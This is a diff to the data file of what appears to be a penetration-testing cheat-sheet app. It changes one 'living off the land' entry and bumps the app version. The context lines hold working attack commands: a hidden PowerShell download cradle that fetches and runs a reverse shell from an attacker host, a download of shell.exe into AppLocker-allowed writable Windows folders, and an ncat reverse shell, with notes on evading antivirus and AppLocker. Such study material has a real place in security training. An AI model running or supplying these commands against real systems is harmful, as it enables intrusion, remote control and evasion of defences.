@@ -751,7 +751,7 @@ const TRACKS=[
    {d:"Run code in memory with a PowerShell download-cradle (no file on disk)",c:"powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://{LHOST}/rev.ps1')\"",
     l:"Host a PowerShell reverse shell (e.g. Nishang Invoke-PowerShellTcp) on your box. Avoids the on-disk exe signature. Honest caveat: AMSI still inspects the script content, so this is not a guaranteed bypass."},
    {d:"AppLocker blocking your binary? write where the default rules allow",c:"# the default publisher rules allow anything under C:\\Windows — these are user-writable:\niwr -Uri http://{LHOST}/shell.exe -OutFile C:\\Windows\\System32\\spool\\drivers\\color\\shell.exe\n# other allow-listed, writable spots:  C:\\Windows\\Tasks  C:\\Windows\\Temp  C:\\Windows\\tracing\n# check what is actually enforced before guessing:\nGet-AppLockerPolicy -Effective -Xml",l:"AppLocker usually ships with the default rules, which allow everything under <code>C:\\Windows</code> and <code>C:\\Program Files</code> and block the user profile — where you naturally drop things. A handful of directories are inside the allowed tree <i>and</i> writable by a normal user; <code>spool\\drivers\\color</code> is the well-known one. The same paths defeat a <code>%TEMP%</code>-based blocklist. Note this is an execution-policy bypass, not an <b>AV</b> bypass — Defender still scans the file, so an msfvenom exe will land and then be eaten. The <i>Corp</i> foothold."},
-   {d:"Live off the land: execute via a trusted, signed Windows binary",c:"# lolbas-project.github.io \u2014 e.g. mshta, regsvr32, rundll32, wmic, msbuild",
+   {d:"Live off the land: execute via a trusted, signed Windows binary",c:"# lolbas-project.github.io \u2014 e.g. mshta, regsvr32, rundll32, msbuild\n# wmic too on an older target, but it is gone from Win11 24H2+ and Server 2025",
     l:"LOLBAS binaries are already present and Microsoft-signed, so they draw less attention than your own exe. Pick the one for the access you have; the site gives the exact invocation."},
    {d:"A plain shell binary instead of a framework stager",c:"ncat {LHOST} {LPORT} -e cmd.exe",
     l:"A generic nc/ncat session carries no Metasploit signature, though nc.exe itself is sometimes flagged. A scripting-language one-liner (python/powershell) is often cleaner than msfvenom output."}
@@ -1069,7 +1069,7 @@ const TRACKS=[
 ]}
 ];
 
-const APP_VERSION="1.6.2";
+const APP_VERSION="1.6.3";
 
 // ---------- storage ----------
 // Everything lives in localStorage, so a private window or a full quota loses
